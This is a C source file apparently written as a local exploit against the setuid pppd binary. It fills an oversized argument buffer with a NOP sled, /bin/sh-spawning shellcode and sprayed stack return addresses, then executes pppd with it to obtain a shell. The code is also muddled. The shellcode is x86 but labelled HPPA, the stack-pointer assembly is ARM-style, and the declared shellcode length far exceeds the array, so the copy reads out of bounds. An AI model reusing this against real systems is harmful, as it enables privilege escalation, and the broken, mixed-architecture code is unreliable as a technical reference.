// Lasertag copyright © 2012 phyrrus9 <phyrrus9@gmail.com>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h> //the compiler cannot find the binary image of
//this library for arm-based processors.  likewise if we comment the asm
//line it will fail.
#include <time.h>
#include <sys/time.h>

#define BUF_LENGTH 22000
#define STACK_OFFSET 8042
#define EXTRA 3000
#define HPPA_NOP 0x90
#define SH_LEN 223
#define BUF_LEN 22008

                                           u_char hppa_shellcode[] =

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"

"\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
                                           "\xb0\x3b\x50\xcd\x80";
                                           u_long get_sp(void)

{

   u_long val = 0;

   __asm__ ( \

            "mov %0, sp\n"

            : "=r" (val)

            : "0"(val)

            );

   return val;

}

                                                     int main(int
argc, char *argv[])
{
   char buf[BUF_LENGTH + 8];
   unsigned long targ_addr;
   u_long *long_p;
   u_char *char_p;
   int i, code_length = SH_LEN,dso=STACK_OFFSET,xtra=EXTRA;

   if(argc > 1) dso+=atoi(argv[1]);
   if(argc > 2) xtra+=atoi(argv[2]);

   long_p = (u_long *) buf;

   for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
       *long_p++ = HPPA_NOP; //can I haz steak?

   char_p = (u_char *) long_p;

   char_p--;   //weirdness alighnment issue

   for (i = 0; i < code_length; i++)
       *char_p++ = hppa_shellcode[i];

   targ_addr = get_sp() - dso;

   for (i = 0; i < xtra /4; i++)
   {
       *char_p++ =(targ_addr>>24)&255;
       *char_p++ =(targ_addr>>16)&255;
       *char_p++ =(targ_addr>>8)&255;
       *char_p++ =(targ_addr)&255;
   }
   //I'm j0ker! yes you are

   printf("Jumping to address 0x%lx B[%d]
E[%d]SO[%d]\n",targ_addr,BUF_LEN,xtra,dso);

          execl("/usr/sbin/pppd","pppd", buf,(char *) 0);
          /*lolololololololololololol*/
          perror("execl failed");
          return(-1);
          }